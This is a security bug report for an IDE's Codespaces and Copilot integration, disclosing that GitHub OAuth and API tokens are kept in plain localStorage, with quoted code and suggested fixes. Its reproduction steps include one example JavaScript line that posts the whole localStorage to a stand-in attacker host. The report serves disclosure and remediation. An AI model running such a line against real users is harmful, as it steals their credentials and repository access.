# [BUG] [alpha] Sensitive GitHub tokens stored in localStorage (frontend-readable) — XSS token exfiltration risk

## Project
ide

## Description
`CodespacesContext.tsx` and `CopilotProvider.ts` persist sensitive GitHub auth tokens (OAuth access tokens and API tokens) directly to browser `localStorage`. This creates a token exfiltration vulnerability: any XSS attack, compromised renderer context, or malicious extension can read these tokens and complete unauthorized actions on behalf of the user.

In Tauri desktop apps with renderer process isolation, `localStorage` is accessible from any loaded webview or content. In browser-based deployments, XSS vulnerabilities in the application allow malicious scripts to dump localStorage and steal tokens.

## Screenshot
![Token Storage Vulnerability](https://raw.githubusercontent.com/njlazzar-su/cortex-bug-hunt/main/screenshots/BUG-006-github-tokens-localstorage.png)

## Evidence

### CodespacesContext.tsx (Lines 213-236)
```typescript
/** Load auth state from localStorage */
function loadAuthState(): GitHubAuthState {
  try {
    const stored = localStorage.getItem(GITHUB_AUTH_KEY);
    if (stored) {
      const parsed = JSON.parse(stored);
      // Check if token is expired
      if (parsed.expiresAt && Date.now() > parsed.expiresAt) {
        localStorage.removeItem(GITHUB_AUTH_KEY);
        return { accessToken: null, user: null, scopes: [] };
      }
      return parsed;
    }
  } catch (e) {
    console.error("[Codespaces] Failed to load auth state:", e);
  }
  return { accessToken: null, user: null, scopes: [] };
}

/** Save auth state to localStorage */
function saveAuthState(auth: GitHubAuthState): void {
  try {
    localStorage.setItem(GITHUB_AUTH_KEY, JSON.stringify(auth));  // ← accessToken stored!
  } catch (e) {
    console.error("[Codespaces] Failed to save auth state:", e);
  }
}
```

### CopilotProvider.ts (Lines 168-197)
```typescript
private loadFromStorage(): void {
  try {
    const oauthJson = localStorage.getItem(STORAGE_KEY_OAUTH_TOKEN);
    if (oauthJson) {
      this.oauthToken = JSON.parse(oauthJson);  // ← OAuth token loaded
    }

    const apiJson = localStorage.getItem(STORAGE_KEY_API_TOKEN);
    if (apiJson) {
      this.apiToken = JSON.parse(apiJson);  // ← API token loaded
    }

    const enabledStr = localStorage.getItem(STORAGE_KEY_ENABLED);
    this.enabled = enabledStr === "true";
  } catch (e) {
    console.error("[Copilot] Failed to load from storage:", e);
  }
}

private saveToStorage(): void {
  try {
    if (this.oauthToken) {
      localStorage.setItem(STORAGE_KEY_OAUTH_TOKEN, JSON.stringify(this.oauthToken));  // ← OAuth saved
    } else {
      localStorage.removeItem(STORAGE_KEY_OAUTH_TOKEN);
    }

    if (this.apiToken) {
      localStorage.setItem(STORAGE_KEY_API_TOKEN, JSON.stringify(this.apiToken));  // ← API saved
    } else {
      localStorage.removeItem(STORAGE_KEY_API_TOKEN);
    }

    localStorage.setItem(STORAGE_KEY_ENABLED, String(this.enabled));
  } catch (e) {
    console.error("[Copilot] Failed to save to storage:", e);
  }
}
```

### What's Stored

**CodespacesContext (`GITHUB_AUTH_KEY`):**
```json
{
  "accessToken": "gho_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  "user": { "login": "...", "id": 123, ... },
  "expiresAt": 1234567890,
  "scopes": ["codespace", "repo", "user"]
}
```

**CopilotProvider (`cortex_copilot_oauth_token`, `cortex_copilot_api_token`):**
```json
{
  "access_token": "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  "token_type": "bearer",
  "scope": "read:user,user:email"
}
```

## Steps to Reproduce

### Scenario 1: XSS token dump
1. User logs into GitHub Codespaces or Copilot
2. Tokens are saved to localStorage
3. An XSS vulnerability is exploited (anywhere in the app)
4. Attacker runs: `fetch('https://evil.com/steal', {method: 'POST', body: JSON.stringify(localStorage)})`
5. **Result**: All tokens exfiltrated to attacker

### Scenario 2: Browser extension data mining
1. User has a potentially untrusted browser extension installed
2. Extension can read all localStorage data
3. Extension logs tokens to its own servers or uses them for unauthorized API access
4. **Result**: Tokens silently harvested

### Scenario 3: Verify in DevTools
1. Log into Cortex IDE with GitHub OAuth
2. Open DevTools → Application → Local Storage
3. Inspect keys:
   - `GITHUB_AUTH_KEY` — Contains Codespaces access token
   - `cortex_copilot_oauth_token` — Contains Copilot OAuth token
   - `cortex_copilot_api_token` — Contains Copilot API token
4. **Result**: Tokens are visible in plain text

## System Information
- Cortex IDE: v0.0.7
- OS: All platforms (Windows, macOS, Linux)
- Components:
  - `src/context/CodespacesContext.tsx` (Lines 213-236)
  - `src/utils/ai/CopilotProvider.ts` (Lines 168-197)
- Runtime: Tauri desktop app + browser deployment

## Root Cause
Both components use `localStorage` directly without token protection:

**CodespacesContext.tsx:234:**
```typescript
localStorage.setItem(GITHUB_AUTH_KEY, JSON.stringify(auth));
```

**CopilotProvider.ts:194-200:**
```typescript
if (this.oauthToken) {
  localStorage.setItem(STORAGE_KEY_OAUTH_TOKEN, JSON.stringify(this.oauthToken));
}
if (this.apiToken) {
  localStorage.setItem(STORAGE_KEY_API_TOKEN, JSON.stringify(this.apiToken));
}
```

In Tauri apps, the renderer webview can read localStorage. In browsers, any XSS can read it. Tokens should be stored in a backend-encrypted session, Tauri secure storage, or at least encrypted with a session-derived key.

## Expected Behavior
GitHub OAuth and API tokens should be stored securely:
- **Tauri**: Use `tauri-plugin-store` with encryption, or native secure storage (keychain/keystore)
- **Browser**: Store in memory-only session, short-lived cookies with HttpOnly/Secure flags, or encrypted in localStorage with a session key
- Tokens should NOT be accessible from renderer scripts, DevTools, or XSS payloads

## Actual Behavior
Tokens are stored as plain JSON in browser `localStorage`:
- Accessible from any script in the renderer process
- Visible in DevTools Application tab
- Readable by XSS attacks and browser extensions
- Exfiltratable to external domains

## Fix Suggestion

### Option 1: Use Tauri secure storage (recommended for Tauri builds)
```typescript
import { Store } from 'tauri-plugin-store';

const store = new Store('.settings.dat');

// Save auth state
await store.set('github.copilot.oauthToken', this.oauthToken);
await store.set('github.copilot.apiToken', this.apiToken);

// Load auth state
this.oauthToken = await store.get('github.copilot.oauthToken');
this.apiToken = await store.get('github.copilot.apiToken');
```

### Option 2: Memory-only with session tokens
```typescript
// Don't persist to localStorage at all
// Store in memory only, require re-auth on restart
private status: CopilotStatus = "disabled";
private oauthToken: CopilotOAuthToken | null = null;
private apiToken: CopilotApiToken | null = null;

// No loadFromStorage() or saveToStorage()
// Tokens live only for the application session
```

### Option 3: Encrypt tokens with session-derived key
```typescript
import { TextEncoder, TextDecoder } from 'util';

// Derive key from session ID (not stored with token)
const sessionKey = deriveKey(sessionId);

function encryptToken(token: string): string {
  // Use Web Crypto API to encrypt with session key
  return encrypt(token, sessionKey);
}

function decryptToken(encrypted: string): string | null {
  try {
    return decrypt(encrypted, sessionKey);
  } catch {
    return null;
  }
}

// Save encrypted
localStorage.setItem(STORAGE_KEY_OAUTH_TOKEN, encryptToken(this.oauthToken.access_token));
```

### Option 4: Use short-lived tokens with refresh rotation
- Store only short refresh tokens (1-2 hour lifetime)
- Access tokens never persisted
- Require fresh token exchange on app start

**Option 2** (memory-only) is the simplest and most secure for a desktop Tauri app where re-auth on restart is acceptable.

## Impact
- **High severity**: Token exfiltration risk
- **Scope**: All GitHub Codespaces and Copilot users
- **Attack surface**: XSS, malicious extensions, compromised renderer, physical access with DevTools
- **Consequences**: Unauthorized repo access, code execution in cloud environments, theft of private repositories

## Related Files
- `src/context/CodespacesContext.tsx` (Lines 213-236) — `loadAuthState`, `saveAuthState`
- `src/utils/ai/CopilotProvider.ts` (Lines 168-197) — `loadFromStorage`, `saveToStorage`
- Storage keys used:
  - `GITHUB_AUTH_KEY`
  - `cortex_copilot_oauth_token`
  - `cortex_copilot_api_token`

## Additional Context
- OAuth tokens grant scopes: `codespace`, `repo`, `user`, `read:user:user:email`
- These scopes provide read/write access to user repositories and GitHub Codespaces
- CVE numbering applicable: XSS + token exfiltration is a security vulnerability
